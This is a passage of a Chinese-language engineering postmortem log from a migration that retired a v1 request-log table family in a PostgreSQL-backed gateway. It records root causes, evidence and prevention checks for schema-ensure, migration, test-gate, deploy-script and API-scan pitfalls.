  （只在 200 时并入 assistant 回复）⇒ `prompt_tokens` 只反映**本轮提示词长度**
  ⇒ 「变小」是预期；且只打印 SKIP 却仍让循环体报 FAIL ⇒ **输出自相矛盾**；
  ③ C 段判据**缺前提**：失败轮次**没到上游** ⇒ `outbound_body` / `response_delta`
  **合法地是 JSON null**（`request_delta` 仍是 array）；
  ④ C 段的**结论行无条件打印「全部是 JSON 数组 OK」**，即使刚报了一堆 FAIL
  ⇒ **结论与失败自相矛盾**。
- 防复发检查：① 写含中文的 bash 脚本时，**变量引用一律带花括号** `${var}`
  （bash 会把 `$var` 后的非 ASCII 字节并进变量名）；② 每条判据写清**前提**
  （什么时候适用）与**不适用时怎么办**（明说 SKIP）；③ **段级结论按本段失败位选文案**，
  不能无条件打印；④ 「检查没跑成」「前提不成立」「结论为负」三者在输出上**必须可区分**。
- 证据：修正后三个会话全部 **PASS** —— `glm-5.2` 5/5=200（token 13→28→42→307→577 单调、
  正文三列全 `array`）、两个 deepseek 5/5=503（`success=f` 落库、B/C 按前提 SKIP）、
  退役族零新增（15 次请求后 4 张退役表仍全 0）。
- 溯源：request_logs→session_turns 复核轮 §5.13.11 / §10.14；[复盘](docs/audit/2026-10-20-request-logs-session-turns-复核轮.md) §5.13.11 / §10.14。

## 2026-10-20 — ★ 「缺什么」的短路判据在对象**被删之后**反而**不**短路（Seen: 1/3）
- 场景：v1 `request_logs` 族退役（迁移 893 真删表）。删表前，一切正常；删表后，
  网关**起不来**，而症状是「**readyz 仍返 200**、但网关没有数据库」。
- 根因：启动路径的三个 ensure 都用同一把尺子——**catalog 短路**：
  「期望的列与索引全部在位 ⇒ 零 DDL」。这把尺子算的是「**缺多少**」：
  ```sql
  (列项)   WHERE to_regclass('public._request_logs') IS NOT NULL AND NOT EXISTS(…)
  + (索引项) WHERE NOT EXISTS (SELECT 1 FROM pg_indexes WHERE indexname = want.name)
  ```
  退役后：列项因 `to_regclass` 为 NULL 而计 **0**（"没缺列"），
  **索引项却计 13**（索引随表一起消失 ⇒ "缺 13 个索引"）⇒ `missing = 13 ≠ 0`
  ⇒ **短路不触发** ⇒ 继续跑 `ALTER TABLE _request_logs …` ⇒ **42P01**。
- 放大成事故的那一步：`42P01` 命中 `db.IsSchemaMismatchError` ⇒ 启动快速失败
  ⇒ `db.Open` 返回 `(nil, err)` ⇒ `dbConn == nil` ⇒ `SetDepsOptional(true)`
  ⇒ **`/readyz` 返 200** ⇒ 部署安全网放行 ⇒ 网关「就绪但没有数据库」。
  ⇒ **一个 DDL 形状问题，最终表现成"部署成功但服务是空壳"**。
- 防复发检查：① 任何「**存在性**」当前提的 ensure，判据必须先问
  **「对象在不在」**（`to_regclass(...) IS NOT NULL`），再问「缺什么」——
  顺序反了就会在对象消失时短路失效；② 短路判据里只要有**「按名字数」**的项
  （索引/触发器/约束），就必须确认这些名字**与被删对象同生共死**——
  否则删对象会让计数失真；③ 启动路径的每个 ensure 都要有一条
  **「族已退役 ⇒ 本函数无事可做 ⇒ 早退」**的显式分支，别指望短路兜底；
  ④ boot 失败时 `readyz` 必须能反映"没有数据库"（否则部署安全网会放行空壳）。
- 证据：真库 3 个 ensure（`ensureRequestLogSchema` / `ensureWorkTypeSchema` /
  `EnsureMaasSchema`）逐一实测：退役后 `missing` 分别为 13 / 1 / 1 ⇒ 短路全部失效；
  补上存在性早退后三者均零 DDL 通过。§5.13 复核轮 §6.2。
- 溯源：request_logs→session_turns 复核轮 §6.2；[复盘](docs/audit/2026-10-20-request-logs-session-turns-复核轮.md) §6.2。

## 2026-10-20 — ★ `CREATE OR REPLACE FUNCTION` 对 SQL 函数体**不在创建时解析**（Seen: 1/3）
- 场景：`recent_success_rate` 被 provider 的候选查询以 `CROSS JOIN LATERAL` 调用。
  退役 v1 时把它的 v1 腿摘掉；迁移文件与 Go 侧运行时 SSOT 各写了一份函数体。
- 根因：`CREATE OR REPLACE FUNCTION … LANGUAGE sql` **不解析函数体** ⇒
  函数体里引用一张**不存在的表**也**建得成功** ⇒ 直到**第一次被调用**才 42P01。
  ⇒ 后果的爆炸半径与"漂移"的严重程度**不成比例**：
  一份 30 行的函数体里差一个表名，症状是
  **「选不出任何上游凭据 ⇒ 100% 流量失败」**，
  而日志里只有一句 `relation "_request_logs_hot" does not exist`——
  根因在一次字符串手术上，症状却像"上游全挂"。
- 防复发检查：① 凡是**函数体**（不是视图体）跨文件存在两份 ⇒ 必须有
  **文本等价**的门（`sql/migrations/startup/migration_890_v1_family_drop_test.go`
  的 `TestMigration890RecentSuccessRateMatchesRuntimeSSOT`）；
  ② 视图体同理（`TestMigration890ProjectionMatchesComposer`）——
  视图体**会**在创建时被解析，但漂移的后果是"自愈把两臂换成三臂 ⇒ 42P01 ⇒ 面板全 500"；
  ③ 改这类函数体时，先问「**谁在调用它、调用失败长什么样**」——
  调用点在请求路径上还是后台任务上，决定了事故形态是"流量全断"还是"面板变暗"。
- 证据：把迁移里的函数体改一行（`probe-%` → `probe-XX%`）⇒ 等价门红；
  还原 ⇒ 绿。`recent_success_rate` 的调用点：`provider/client.go` 候选查询。
- 溯源：request_logs→session_turns 复核轮 §6.3；[复盘](docs/audit/2026-10-20-request-logs-session-turns-复核轮.md) §6.3。

## 2026-10-20 — ★ 「真删表」的第一顺位不是删，是**删完之后谁会 42P01**（Seen: 1/3）
- 场景：目标要求"把 `_request` 前缀的待删表**真正删掉**"。删表本身只有 6 条
  `DROP`；但真正的工作量在**删表之后**。
- 根因：v1 族被 286 处 Go SQL 引用（其中 ~168 处是**基表**直读，不是走 canonical
  视图的）⇒ 删表后**任何提到 v1 关系的语句整条 42P01**（不是"那条腿空"，
  是**整条语句失败**）⇒ 覆盖 admin 读面、bg 后台任务、请求路径上的凭据解析。
  ⇒ 真正的工作量是**把 168 处读面迁到会话族**，不是写 DROP。
- 防复发检查：① 「删对象」类变更的清单必须先列**引用图**
  （基表 / 视图 / 函数 / 触发器 / 启动路径 DDL），再动手；
  ② **启动路径的 DDL 优先于读面**——它决定网关能不能起来；
  ③ 读面按「**会不会让请求路径失败**」排序（凭据候选查询 > 请求体读 > 后台聚合）；
  ④ 「整条语句失败」这条语义决定了**UNION 的一条腿**也必须删，
  不能只把 v1 腿换成"空集"。
- 证据：真库 `pg_depend` + 逐文件扫描得 168 处基表直读；`recent_success_rate`
  一处就足以让 100% 流量失败；`bg/` 20 处 + `admin/` 136 处会让 30+ 个面板/探针
  同时变暗。§6.1。
- 溯源：request_logs→session_turns 复核轮 §6.1；[复盘](docs/audit/2026-10-20-request-logs-session-turns-复核轮.md) §6.1。

## 2026-10-20 — ★ 投递通道对「改名后」的处理**不一致** ⇒ 迁移要同时写两种物理名（Seen: 1/3）
- 场景：860 把 `request_logs` 族改名成 `_request_logs`（"待删标志"）。
  890 要把它删掉。写下 `DROP TABLE public.request_logs` 之后发现：
  部署通道会把它**自动改写**成 `_request_logs`，而**安装器不会**。
- 根因：三条投递路径对"改名后"的处理**不是同一套**：
  · 部署通道 `scripts/apply-db-revision-sequence.sh` 有 runtime adapter，
    按真库探测代际（legacy / renamed / mixed / ambiguous）后**词法改写**
    `request_logs` → `_request_logs`；
  · 安装器 `installer/internal/dbinit/runner.go` **逐字执行**迁移文件；
  · 新装路径在 860 之后族已经是 `_request_logs`。
  ⇒ 写死任一种拼写，都会让**另一条通道**的 DROP 静默不生效
  （`DROP TABLE IF EXISTS` 不报错 ⇒ **零信号** ⇒ 族还在那儿，
  而所有读面已经按"族没了"改过了 ⇒ 下次启动 42P01）。
- 防复发检查：① 任何触及**被改过名**的族的迁移，必须同时写**两种物理名**
  （`request_logs` 与 `_request_logs`），并用「**存在才删**」的动态 SQL；
  ② 改写正则只认**整词**（`(?<![\w$])request_logs(?:_bodies_hot|_bodies|_hot|_archive|_id_seq)?(?![\w$])`）
  ⇒ 视图名（`request_logs_with_current_month…`）**不会**被改写
  ⇒ 视图名写原名、表名写两种拼写，**别弄反**；
  ③ 判"某个名字出现了没有"**绝不用 `LIKE` 配 `_`**（`_` 是单字符通配符）。
- 证据：三条通道的差异逐条读代码确认（部署通道 adapter 的代际探测 + 安装器
  无改写）；893 的删除步骤用「两种拼写都试 + `to_regclass` 存在才删」；
  真库往返验证 up→down 后族与三臂视图逐字还原。§6.4。
- 溯源：request_logs→session_turns 复核轮 §6.3；[复盘](docs/audit/2026-10-20-request-logs-session-turns-复核轮.md) §6.3。

## 2026-10-20 — ★ 变异验证必须先确认「**变异真的应用了**」（Seen: 1/3）
- 场景：给 893 的 6 道契约门做变异验证。5 处按预期变红，**1 处没红**。
- 根因：那一处的变异是"把投影里的 `t.ts AS ts,` 改成 `t.ts + interval '0 seconds' AS ts,`"，
  而迁移文件里那行是**制表符缩进**、我按**四个空格**写的替换串 ⇒
  `str.replace` **没匹配上** ⇒ 文件**没变** ⇒ 门当然绿。
  ⇒ **"门绿了"这件事，当时既可能是"门在工作"，也可能是"文件根本没被改"**——
  两者在输出上**长得一模一样**。
- 防复发检查：① 变异脚本**必须自证**：`assert new != old`（或打印 sha 对比），
  没应用就**直接失败**，不许"继续跑测试看颜色"；
  ② 变异的目标串要用**从文件里读出来的**内容（而不是手打的字面量），
  或至少在替换后校验命中次数 == 期望次数；
  ③ 变异验证的结论要写成「**该处变异应用后门变红**」，
  而不是「该处门能发现这类问题」——后者在变异没应用时也是成立的。
- 证据：改用 tab 缩进后重跑 ⇒ 该处**变红**；把 Go 侧投影也改一次 ⇒
  **同一个门双向都红**（迁移侧漂移与代码侧漂移都能被抓）。
- 溯源：request_logs→session_turns 复核轮 §6.9；[复盘](docs/audit/2026-10-20-request-logs-session-turns-复核轮.md) §6.9。

## 2026-10-20 — ★ `sql/objects/` 是「**从不应用、但对基线承重**」的**第四份**表示（Seen: 1/3）
- 场景：真删 v1 族时，我判定 `sql/objects/` 是「部署后形态的 SSOT」，把 5 张分析视图改成了会话族形态 ⇒ 883/884 的门红了。
- 根因：`sql/objects/` **不是**部署形态的 SSOT。仓库自己的 `scripts/audit/baseline-reconcile.py` 明写它是
  「**第四份表示、从不应用**（唯一引用是 `deploy/sql/sync-objects.sh` 的单向拷贝）、但**对基线承重**
  （部分基线对象的**唯一出处**）」；`sql/schema/objects_registry_test.go` 同款结论。
  ⇒ 改了它 ⇒ **新装路径**的基线 `CREATE VIEW` 急切校验了**尚不存在**的 `session_turns_hot`
  （它由**启动序列**建、基线不建）⇒ 42P01 **中止整个安装**；
  ⚠ 而**升级路径是绿的**（升级路径上启动序列先跑）⇒ 「升级绿」会骗人。
- 防复发检查：① 动 `sql/objects/` 之前先问「**这份表示被谁消费**」——
  审计器明说它**从不应用** ⇒ 它的价值在**基线**，不在部署形态；
  ② 「部署形态」交给**迁移**换上（883/884 先例），`sql/objects/` 保持**基线 fallback 溯源体**；
  ③ 这类对象要在 `internal/sqlreadguard` 里登记成 **LEGIT（基线 fallback 溯源体，非生产读面）**，
  否则零债棘轮会逼着人去改它 ⇒ 白白破掉新装路径；
  ④ 改完必须跑**新装链**（不是只跑升级链）。
- 证据：真库临时库实测——新装路径报 42P01 中止，而升级路径绿；
  回退 5 张视图到 v1 fallback 体后新装链 **0 of 282 fail**；
  `internal/sqlreadguard` 白名单 1 → 6 条 LEGIT、`debtBaseline` 仍为空。
- 溯源：request_logs→session_turns 复核轮 §6.8；[复盘](docs/audit/2026-10-20-request-logs-session-turns-复核轮.md) §6.8。

## 2026-10-20 — ★ `pg_get_functiondef` 的输出**没有结尾分号**，而 dollar-quote 的**开引号行**与**闭合行**几乎一样（Seen: 1/3）
- 场景：把真库的函数定义灌进 down 迁移脚本来「逐字复原被删的函数」，psql 报
  `syntax error at or near "CREATE"`。
- 根因（两层）：① `pg_get_functiondef` 的输出**不带结尾分号** ⇒ 直接拼进脚本时，
  psql 会把下一个 `CREATE OR REPLACE` **并进同一条语句**；
  ② 更阴的一层：我用「行尾是 `$function$`」来找**闭合定界符行**，
  而**开引号行** `AS $function$` 也满足这个条件 ⇒ 分号补到了**开引号**上，
  并且补完就 `i = j+1` **跳过了整个函数体** ⇒ 20 个函数只剩 19 个、其中一个被吞掉。
- 防复发检查：① 往脚本里灌 DDL 时，**先确认每条语句的分号**（`pg_get_functiondef` / `pg_dump` 的输出都不带）；
  ② 找 dollar-quote 的**闭合行**要用「**整行恰好等于** `$function$` / `$$`」，
  **不是**「行尾包含」——`AS $function$` 与 `$function$` 只差一个前缀；
  ③ 灌完**数语句条数**并与源对象数对账（本轮：20 个函数/过程 + 1 个重载 ⇒ 期望 20 条 CREATE，
  实测 19 ⇒ 当场抓到）；④ 灌完**真库往返**（up → down → 比对 `pg_get_functiondef` 全等），
  这道真库门才是最终裁判，静态数数只是它的前置。
- 证据：补分号后重灌 → 20/20；真库往返实测 20/20 函数定义与 up 前**逐字一致**、2 个触发器复原。
- 溯源：request_logs→session_turns 复核轮 §6.7；[复盘](docs/audit/2026-10-20-request-logs-session-turns-复核轮.md) §6.7。

## 2026-10-20 — ★ down 迁移的「文件头声称」要用**集合比对**钉住，数个数挡不住「补了 4 个、漏了 4 个」（Seen: 1/3）
- 场景：893 的 down 文件头写着「那些函数**也**被 890 删了，所以本 down 一并把它们装回去」，
  而 890 up 删的是 **20 个**函数/过程 + 2 个触发器函数 —— down 实际只复原了 **4 个**。
- 根因：门只检查了「down 里有这几个名字」（**存在性**），没检查「**up 删掉的都在**」（**完备性**）。
  ⇒ 文件头与实现不符这件事，在「只查存在性」的门下**永远绿**。
  ⚠ 更隐蔽的一层：已复原的那 4 个，函数体取自**陈旧正典** `sql/objects/functions/`，
  与**真库部署版**逐字比对后**实质不同**（真库版多了 advisory lock 串行、默认分区约束处理、
  legacy shell 重挂）⇒ 回滚会装回一个**更弱**的分区函数 ⇒ **存在性绿 ≠ 有用**。
- 防复发检查：① down 类迁移的门要比**集合**（up 的 DROP 清单 ⇔ down 的 CREATE 清单），
  不是比「有没有某个名字」；② **重载按条数比**（本轮 `credential_most_used_model` 有两个重载 ⇒
  20 个对象只有 19 个名字，只比名字集合会漏掉「少复原一个重载」）；
  ③ down 的函数体**优先取真库定义**（`pg_get_functiondef` / `pg_get_triggerdef` / `obj_description`），
  正典 objects 层是**静态 SSOT**，可能比部署版旧；④ 文件头与实现不一致时，
  优先怀疑**文件头**（它是给人读的承诺，代码才是事实）。
- 证据：890 down 由「4 个」补到「20 个函数/过程 + 2 个触发器」；真库往返实测 20/20 逐字一致；
  三道新门 + 3 项变异（删函数体 / 删触发器 / 改函数名）全部转红、源文件按字节还原。
- 溯源：request_logs→session_turns 复核轮 §6.7；[复盘](docs/audit/2026-10-20-request-logs-session-turns-复核轮.md) §6.7。

## 2026-10-20 — ★ 负向判定必须按**标识符边界**：canonical 视图名里就含 `request_logs`（Seen: 1/3）
- 场景：要给「`bg/routing_health_checks.go` 不再读 v1 族」写负向断言，第一版用
  `strings.Contains(sql, "public.request_logs")`。
- 根因：canonical 视图叫 **`request_logs_with_current_month`**（它**活着**，只是从三臂变两臂）
  ⇒ `Contains` 会把它判成 v1 读点 ⇒ 负向断言**假红**；
  反过来，若把判据放宽成「只看 `request_logs` 子串」，又会把**视图名**漏掉（真阳性丢失）。
  ⚠ 与已有的「`LIKE` 配 `_`」是同一族陷阱（`_` 是单字符通配符），但这次是**子串 vs 标识符**的版本。
- 防复发检查：① 判「SQL 里有没有提到某个关系」要**剥掉注释与字符串字面量**后按**标识符**切分再**精确匹配**；
  ② 每条负向断言配**阳性对照**（同一判据必须能对真读点报红）与**阴性对照**
  （必须对那个「名字里含关键词」的合法对象**不**报红）——没有对照的负向断言恒绿；
  ③ 阴性对照必须**非空洞**：断言那个名字里**确实含**关键词子串（否则对照证明不了任何事）。
- 证据：判据自检门（正例 `public._request_logs` 必报、负例 `public.request_logs_with_current_month` 必不报）
  + 3 项变异（重新引入 v1 读点 / 改掉会话族源 / 把视图名塞进 v1 清单）全部转红。
- 溯源：request_logs→session_turns 复核轮 §6.6；[复盘](docs/audit/2026-10-20-request-logs-session-turns-复核轮.md) §6.6。

## 2026-10-20 — ★ Go 侧判「SQL 里有没有提到某关系」必须走 `go/ast` 取**字符串字面量**（Seen: 1/3）
- 场景：要给 bg 的检查侧写「不再读 v1 族」的负向断言。
- 根因：按行剥 `//` 会把 Go 字符串字面量**截断**（字面量里可以含 `//`、`--`）；
  而直接扫全文又会把源码里的**退役说明注释**判成读点 ⇒ 门恒绿。
  ⚠ 本仓的 `stripSQLComments` 只剥 **SQL** 注释（`--` / `/* */`），**剥不掉 Go 注释**（`//`）
  ⇒ 用它处理 Go 源文件是**用错了尺子**。
- 防复发检查：① Go 侧一律用 `go/ast` 取**字符串字面量**（本仓 `goStringLiterals` 已是公共写法）；
  ② 解析失败按 `t.Fatal` 处理 —— 宁可红在「读不到」，也不要静默放行；
  ③ 「SQL 文本」与「Go 源码」是两种材料，**量具不能互换**。
- 证据：F1 三道门（退役守卫的读点检测）全部用 AST 判定；把源码注释里加一句「读 `_request_logs`」后门仍绿（正确）。
- 溯源：request_logs→session_turns 复核轮 §6.5；[复盘](docs/audit/2026-10-20-request-logs-session-turns-复核轮.md) §6.5。

## 2026-10-20 — ★ text 型的 `credential_id` 用**空字符串**表示「无凭据」（不是 NULL）（Seen: 1/3）
- 场景：把负成本导出行从 v1 族迁到会话族时，`credential_id` 的类型从 bigint 变成 **text**。
- 根因：会话族的 `credential_id` 是 text，且「无凭据」用**空字符串**表示（真库实测 535 行里 **453 行是空串**，
  不是 NULL）⇒ `IS NULL` 判不出来；直接 `::bigint` 转换会在空串上**报错**（22P02）。
- 防复发检查：① 任何 text→数字的转换都要**安全转换**：
  `CASE WHEN credential_id ~ '^[0-9]+$' THEN credential_id::bigint END`（本仓既有先例：
  `idx_session_turns_hot_credential_ts` 用的就是同一形态）；② 「无凭据」要同时判
  `IS NULL` **与** `= ''`；③ 导出脚本的表头/列序变了 ⇒ **对拍门**要跟着换口径（本轮
  `TestNegativeCostExportParity` 从「已登记漂移」升级成**完整对拍**）。
- 证据：真库端到端跑通（EXIT=0、9 个小节齐全、CSV 表头 `credential_id,raw_model_name,…`）；
  分组列从 `outbound_model` 改为 `raw_model_name`（会话族的 `model` 列落的是 **client_model**，不是出站模型）。
- 溯源：request_logs→session_turns 复核轮 §6.3；[复盘](docs/audit/2026-10-20-request-logs-session-turns-复核轮.md) §6.3。

## 2026-10-20 — ★ 两个 `WITH` 不能串联 ⇒ 多源并集要写成**括号化子查询**（Seen: 1/3）
- 场景：把导出脚本的 v1 源换成会话族两臂（`session_turns_hot ∪ session_turns`）并「与别的 CTE 共存」。
- 根因：写成 `WITH a AS (...), b AS (WITH c AS (...) SELECT ...)` ⇒ PostgreSQL 报
  `syntax error at or near "WITH"` ⇒ **嵌套 WITH 在这个位置不被接受**。
- 防复发检查：① 多个来源要并集时，写成**括号化子查询**形态
  `FROM ( SELECT … FROM a UNION ALL SELECT … FROM b ) r`（可以与外层 CTE 共存）；
  ② 改完必须**真库跑一遍**（本轮是端到端跑导出脚本，EXIT=0 才算过），
  静态看 SQL 读不出「这个位置能不能嵌 WITH」。
- 证据：改括号化子查询后导出脚本端到端通过；真库实测 details 侧 JOIN **1:1**（535/535、1002/1002 ⇒ 不扇出）。
- 溯源：request_logs→session_turns 复核轮 §6.3；[复盘](docs/audit/2026-10-20-request-logs-session-turns-复核轮.md) §6.3。

## 2026-10-20 — ★ 「零命中」有两种成因：真干净 / 扫描器坏了 ⇒ 零债棘轮要用**合成样本**自证（Seen: 1/3）
- 场景：把 `internal/sqlreadguard` 的 v1 读面债棘轮推到 **0**（v1 桶 0 文件 / 0 处）。
- 根因：「0 命中」既可能是「真的没有读点」，也可能是「**扫描器没扫到**」⇒ 两者在输出上**一模一样**。
  ⇒ 零债棘轮越严，越可能**锁死一把坏尺子**。
- 防复发检查：① 零债棘轮必须配**合成样本**：故意放一条 v1 读点进临时目录，
  断言扫描器**能报出来**（本轮用 LEGIT 白名单 + 判据自检两道）；
  ② 白名单从 1 条增到 6 条时，每条都要写明**为什么它是合法豁免**（本轮 5 条是「基线 fallback 溯源体」）；
  ③ 「债为 0」不是「没问题」——它只说明**这把尺子**此刻没报。
- 证据：LEGIT 6 条 + `debtBaseline` 仍为空；判据自检（正例必报、负例必不报）+ 变异全部转红。
- 溯源：request_logs→session_turns 复核轮 §6.8；[复盘](docs/audit/2026-10-20-request-logs-session-turns-复核轮.md) §6.8。

## 2026-10-20 — ★ 停写键的**代码默认**被翻转 ⇒ 「门关着的理由已过期、后果却不可逆」（Seen: 1/3）
- 场景：上游把 `storage.request_logs_write_enabled` 的**代码默认**由 true 改成 false，
  而 bg 里三条扫描的「可比性守卫」仍读这个键。
- 根因：守卫的**前提**（证据源不再前进 ⇒ 不可判定 ⇒ 跳过）在证据源随 890 迁到会话族之后**已过期**，
  但守卫**还在** ⇒ 在任何**未显式配置**该键的环境（新装 / 克隆 / 灾备）上，扫描**永久停摆**，
  且跳过被记成正常 skip ⇒ **零错误信号**。
  ⚠ 关键在于「**默认值的翻转把「显式关闭」变成了「默认关闭」**」——出问题的不是配置，是**默认**。
- 防复发检查：① 任何「按某个键决定跳过」的守卫，键的**默认值**翻转时必须**重新评估**该守卫的前提；
  ② 守卫的**前提**与守卫的**输入**要分开评估：本例是「输入（读已退役的键）与前提（源不前进）双双失效」；
  ③ 处置不是「保留旧行为」，而是**退役过期守卫 + 保留每条扫描自己的开关/判据**
  （本轮：36h 回看有独立 interval 开关、健康检查恒执行、账务比对换成**数据驱动**判据
  `usageCreditComparable(usageArmRows, diffRows)`）；④ 退役后的 reason 要进**闭集**并保持指标序列连续。
- 证据：三条扫描的守卫全部退役；`bg/` 全绿（34.5s）；4 道新门 + 9 项变异全部转红；
  `deploy/prometheus/rules/s4-scan-skip.yml` 的 reason 闭集同步更新为 {s4_stop_write, usage_arm_empty}。
- 溯源：request_logs→session_turns 复核轮 §6.5；[复盘](docs/audit/2026-10-20-request-logs-session-turns-复核轮.md) §6.5。

## 2026-10-20 — ★ 「字符串相等」≠「同一份数据」：路径判定必须按**物理路径**（Seen: 1/3）
- 场景：`deploy-local.sh` 的「容器数据目录 == 共享目录吗」判定，导致本地部署整条中止
  （`docker run` 报 `Bind for 127.0.0.1:5432 failed: port is already allocated`，网关没起来）。
- 根因：判定用**字符串**比两条路径，而宿主机上共享目录是**软链**
  （`~/kaixuan/postgres -> postgres-citus`）⇒ 判成「未绑定」⇒ 触发几百 MB 级数据搬迁 +
  容器重建；而（**本轮改动前**的）重建那一步**硬编码 5432**（同仓 compose 模板却是
  `${LLM_GATEWAY_PG_PORT:-5432}`），该端口已被别的实例占住 ⇒ **重建必失败 ⇒ 整条部署中止**。
  ★ 合并上游后查实：上游**已把重建端口改成沿用旧容器已发布的 host 端口**
  （`dl_pg_publish_spec`）⇒ 这一层在当前树上**已不存在** ⇒ 排查时要用**当前树**的代码，
  不要拿合并前的分支去归因。
  真正要问的不是「路径写法一样吗」，而是「**是不是同一份数据**」。
- 防复发检查：① 凡是「这两个路径是不是同一个东西」的判定，都用**物理路径**
  （`cd … && pwd -P`）而不是字符串，并先问「有没有可能是同物异名」（软链、绑定挂载、`/private/var` 别名）；
  ② 判定函数放进**可 source 的 lib** 并配契约门（软链==目标、不同==不同、空输入==不同、
  不存在路径回退非空、脚本必须走该函数），本轮 2 项变异全红；
  ③ 部署脚本里凡有「固定端口」与「模板端口」两处，视为**不一致缺陷**；本轮登记后经合并查实**上游已修**（沿用旧容器端口）⇒ 登记要在合并后**复核一次**再定遗留。
- 证据：`scripts/deploy-local-lib.sh`（`dl_physical_path` / `dl_same_physical_dir`）、
  `scripts/deploy-local.sh`（判定改造）、`tests/deploy_local_contract_test.sh`（新门 + 2 项变异全红）；
  宿主机 `~/kaixuan/postgres -> postgres-citus`；部署后 `VERIFY_PASS=1`（release 2.5.8.2766）。
- 溯源：request_logs→session_turns 复核轮 §6.13；[复盘](docs/audit/2026-10-20-request-logs-session-turns-复核轮.md) §6.13。

## 2026-10-20 — ★ 长流的「耗时」是**流时长**，不是响应延迟 ⇒ 量延迟要看 TTFB（Seen: 1/3）
- 场景：逐 API 扫描报出 `/api/free-pool/stream` 89.7s、`/api/admin/system-monitor/stream` 51.1s，
  按「>2s 必须定位」本应去查慢 SQL——实际是**假慢**。
- 根因：SSE / 长轮询端点的响应**不结束**，客户端「等响应」的时长等于**流的持续时间**；
  首字节 1.6ms 就到了。`curl -w time_starttransfer` 实测 TTFB = 1.6ms / 1.8ms。
- 防复发检查：扫出「慢端点」先问「返回的是**一次性响应**还是**流**」；流式端点一律用 **TTFB** 量，
  不用「读到 EOF」的总时长。⇒ 与「量具的计时边界必须与被测语义对齐」同族。
- 证据：§6.14 的 API 扫表 + `curl -w` 复测（TTFB 1.6ms / 1.8ms）。
- 溯源：request_logs→session_turns 复核轮 §6.14。

## 2026-10-20 — ★ 扫出 404 先怀疑**量具用错了 ID**；路由 404 有三类成因（Seen: 1/3）
- 场景：逐页扫里 `/api/keys/1`、`/api/admin/sessions/1/turns`、
  `/api/admin/session-analytics/clients/1` 全是 404，看着像端点坏了。
- 根因：① 扫描器把 `:id` 一律替换成 `1`，而这些 ID 空间里 **1 不存在**
  （真 key id=10、session id=`gw_…`、client id 是模型名）⇒ 是**量具**问题不是被测问题；
  ② 路由 404 混着三类：**Go 默认 mux 404**（未注册）、**前缀分发器按设计 404**
  （`/api/admin/model-integrity` 要 `summary`/`events`/`fingerprint-drift`）、
  **handler 级 not found**（JSON 正文）。
- 防复发检查：动态段替换出来的 404/4xx **必须用真实 ID 复测一次**再下结论（真实 ID 从库里取），
  并把「用真实 ID 复测 → 200」写进验收记录；判「端点不存在」前先看 **404 正文形态**
  与**路由是不是前缀**（前缀型路由要扫真实子路径才算覆盖）。
- 证据：`/api/keys/10` 200、`/api/admin/sessions/gw_ca40172f…/turns` 200、
  `/api/admin/session-analytics/clients/grok-4.6` 200；`admin/model_integrity.go:66`。
- 溯源：request_logs→session_turns 复核轮 §6.14。

## 2026-10-20 — ★ 写链路验收要看**正文类型**与**正文的目标表**，不是「有没有落行」（Seen: 1/3）
- 场景：v1 族真删后验收写链路，第一眼看到 `session_turns.request_delta/response_delta`
  全是 JSON **null**，差点判成「正文丢了」。
- 根因：本形态的正文在 `session_bodies*` 族（`outbound_body`，JSON **array**）；
  `session_turns` 那两列是**另一个开关控制的可选写入**，本机上恒 NULL 是**既有状态**。
- 防复发检查：判「正文是否落库」先确认**正文的目标表**与**类型**（`jsonb_typeof(...)` 是 array
  才算有正文）；并拿**本轮改动之前**的同形态历史行做对照，否则分不清「回归」与「既有形态」。
- 证据：本轮 200 行 `session_bodies_hot.outbound_body` = `array`，长度 37 → 119 → 200（随多轮增长）；
  部署前的历史 200 行 `session_turns.request_delta` 同样为 null ⇒ 非回归。
- 溯源：request_logs→session_turns 复核轮 §6.14。
## 2026-10-21 — 判据扫描器的「**枚举范围**」比它的「**判定逻辑****更隐蔽地决定覆盖面（Seen: 1/3）
- 场景：i18n 跨语种「键存在性平价」门（R56 轮新增 `web/src/i18n/localeKeyParity.ts`）。
  R55 轮已建的 `callSiteParams.ts` 扫描器**判定逻辑是对的**，
  但它**只枚举「第二参数是对象字面量」的调用点** ⇒ 模板键调用点里 59 个只扫到 3 个。
- 根因：扫描器**先按用途裁剪了输入**（它是为「调用点传了哪些具名参数」服务的 ⇒
  没有对象字面量就没有具名参数可解析 ⇒ 直接跳过），
  而「**这个键存不存在**」这个问题**与第二参形态无关** ⇒
  ⇒ 被裁掉的输入里**恰好藏着 R55 缺陷自己的调用点**
  （模板键 + 非对象第二参）⇒ R55 只能用**手写定点回归**兜住那一族，
  而**机制本身是瞎的** ⇒ 下一个同形状的键族来了照样漏。
- 防复发检查：新增/复用**扫描器**时，先问一句「**它为了什么用途裁剪了输入？**
  另一个用途会不会需要被我裁掉的那部分？」⇒ 若会，则要**另开一个枚举口**
  （本轮做法：同一套掩码 + 同一套 `CALL_RE`，另开 `scanCallSiteKeys`，
  **实测是旧扫描器的真超集** —— 反向差集 = 0）。
  ⇒ 配套：**两套扫描器并存时必须做「差集对照」**，
  断言「只有旧版找到的 = 0」⇒ 否则新版可能是个**更窄**的漏斗。
- 证据：`web/src/i18n/callSiteParams.ts` 新增 `scanCallSiteKeysInSource` /
  `scanAllCallSiteKeys`；实测调用点 337 → 5278、模板候选键 5 → 455（90 倍）；
  `localeKeyParity.test.ts` 的「★ 新扫描器是旧扫描器的真超集」那条断言钉住该性质；
  变异 M6（让新扫描器退回旧口径）⇒ **非空下限**那条红（可达 4843 < 5000）。
- 溯源：R56 轮（2026-10-21）`docs/96小时内修订审计-20261007-1350.md` §十四。

## 2026-10-21 — 「存在性」类判据的**键集合口径**必须与**引用扫描**同源（Seen: 1/3）
- 场景：同一个 R56 轮的门，首版就报了 3 条硬闸违例
  （`modulesView.integration.feishuSteps` 等「8 个语种全缺」）。
  追下去发现是**量具自己的口径问题**，不是产品缺陷。
- 根因：仓里已有两套「键/值收集」逻辑 ——
  ① `scanner.ts` 的 `collectLeafKeys`：**数组也算一个键**
  （vue-i18n 允许 `t('path')` 返回整个数组供 `v-for` 渲染）；
  ② `localeValueQuality.ts` 的 `collectLeafValues`：**只收字符串叶子**。
  ⇒ 我用 ② 算「键集合」、用 ① 做「引用扫描」⇒ **两套口径互相抵消**
  ⇒ 数组型键被误判成「该语种缺这个键」。
- 防复发检查：判「**键是否存在**」时，键集合**必须复用引用扫描那套**
  （`scanner.ts` 的 `collectLeafKeys`），**不要**另写一套；
  ⇒ 若确实需要另一套（如只收字符串），**必须显式命名并注明与哪套不同**
  （如 `localeValues` 与 `allLocaleKeySets`），**绝不能让两者在同一道门里混用**。
